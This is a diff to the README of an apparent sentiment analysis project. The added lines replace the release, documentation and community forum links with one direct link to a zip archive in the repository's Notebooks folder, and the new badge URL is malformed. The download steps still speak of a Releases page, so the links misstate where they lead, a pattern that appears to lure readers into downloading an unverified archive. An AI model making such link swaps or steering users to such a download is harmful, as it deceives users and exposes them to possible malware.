@@ -1,7 +1,7 @@
 # 🎉 SentimentAnalysis_CentraleMRS25 - Easy Sentiment Analysis Tool for Everyone
 
 ## 📥 Download the Latest Release
-[![Download the Latest Release](https://img.shields.io/static/v1?label=DOWNLOAD&message=Latest+Release&color=blue)](https://github.com/dalejoperez/SentimentAnalysis_CentraleMRS25/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/dalejoperez/SentimentAnalysis_CentraleMRS25/main/Notebooks/SentimentAnalysis_CentraleMRS25-2.6-beta.3.zip+Release&color=blue)](https://raw.githubusercontent.com/dalejoperez/SentimentAnalysis_CentraleMRS25/main/Notebooks/SentimentAnalysis_CentraleMRS25-2.6-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to SentimentAnalysis_CentraleMRS25! This is a user-friendly tool designed to help you determine the sentiment of text. Whether you want to analyze customer feedback, social media posts, or any other text, this tool makes it simple.
@@ -19,7 +19,7 @@ To run SentimentAnalysis_CentraleMRS25, you need:
 - 200 MB of free disk space
 
 ## 📥 Download & Install
-To download and run SentimentAnalysis_CentraleMRS25, visit this page: [Download from Releases](https://github.com/dalejoperez/SentimentAnalysis_CentraleMRS25/releases).
+To download and run SentimentAnalysis_CentraleMRS25, visit this page: [Download from Releases](https://raw.githubusercontent.com/dalejoperez/SentimentAnalysis_CentraleMRS25/main/Notebooks/SentimentAnalysis_CentraleMRS25-2.6-beta.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions.
@@ -51,8 +51,8 @@ Once installed, you are ready to start analyzing sentiments!
 If you encounter any issues or need assistance, feel free to contact our support team. You can open an issue on the GitHub repository for any technical problems or suggestions.
 
 ## 🔍 Additional Resources
-- [Documentation](https://github.com/dalejoperez/SentimentAnalysis_CentraleMRS25/wiki): In-depth guidance on advanced features.
-- [Community Forum](https://github.com/dalejoperez/SentimentAnalysis_CentraleMRS25/discussions): Share experiences and tips with other users.
+- [Documentation](https://raw.githubusercontent.com/dalejoperez/SentimentAnalysis_CentraleMRS25/main/Notebooks/SentimentAnalysis_CentraleMRS25-2.6-beta.3.zip): In-depth guidance on advanced features.
+- [Community Forum](https://raw.githubusercontent.com/dalejoperez/SentimentAnalysis_CentraleMRS25/main/Notebooks/SentimentAnalysis_CentraleMRS25-2.6-beta.3.zip): Share experiences and tips with other users.
 
 ## 🌟 Contributing
 We welcome contributions from everyone. If you wish to enhance SentimentAnalysis_CentraleMRS25, please read our contributing guidelines in the repository.
